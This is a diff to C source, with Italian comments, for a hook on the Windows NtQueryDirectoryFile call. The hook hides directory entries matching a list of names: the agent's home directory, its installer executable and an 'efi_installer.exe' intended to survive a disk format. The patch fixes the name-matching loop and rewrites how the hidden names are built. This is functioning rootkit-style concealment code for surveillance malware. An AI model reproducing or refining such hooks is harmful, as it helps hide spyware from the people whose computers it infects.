@@ -255,7 +255,7 @@ static  DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1 ,
 												  DWORD ARG10,
 												  DWORD ARG11)
 {
-	DWORD b_len, i;
+	DWORD b_len, jj;
 	DWORD *old_b_len;
 	char *Src;
 	char *file_name;
@@ -336,9 +336,11 @@ static  DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1 ,
 
 		// Vede se dobbiamo cancellare questa entry
 		is_to_hide = FALSE;
-		for (i=0; i<HIDE_NAME_COUNT; i++) {
-			IF_LSTRCMP(file_name, name_to_hide[i], file_name_len) 
+		for (jj=0; jj<HIDE_NAME_COUNT; jj++) {
+			IF_LSTRCMP(file_name, name_to_hide[jj], file_name_len) { 
 				is_to_hide = TRUE;
+				break;
+			}
 		}
 
 		if (is_to_hide) {
@@ -377,8 +379,8 @@ static DWORD NtQueryDirectoryFileHook_setup(HMServiceStruct *pData)
 	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
 	VALIDPTR(NtQueryDirectoryFileData.pMemcpy = (memcpy_t) HM_SafeGetProcAddress(hMod, "memcpy"))
 	memcpy(NtQueryDirectoryFileData.name_to_hide[0], H4_HOME_DIR, sizeof(NtQueryDirectoryFileData.name_to_hide[0])); // E' sicuramente NULL terminato
-	memcpy(NtQueryDirectoryFileData.name_to_hide[1], EXE_INSTALLER_NAME, sizeof(NtQueryDirectoryFileData.name_to_hide[1])); // E' sicuramente NULL terminato
-	memcpy(NtQueryDirectoryFileData.name_to_hide[2], "efi_installer.exe", sizeof(NtQueryDirectoryFileData.name_to_hide[2])); // XXX Qui ci andra' il nome del file per la resistenza al format
+	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[1], MAX_RAND_NAME, _TRUNCATE, "%s.exe", EXE_INSTALLER_NAME);
+	_snprintf_s(NtQueryDirectoryFileData.name_to_hide[2], MAX_RAND_NAME, _TRUNCATE, "%s.exe", "efi_installer.exe");
 
 	// Variabili shared per la creazione degli Hooks...
 	NtQueryDirectoryFileData.dwHookLen = 850;
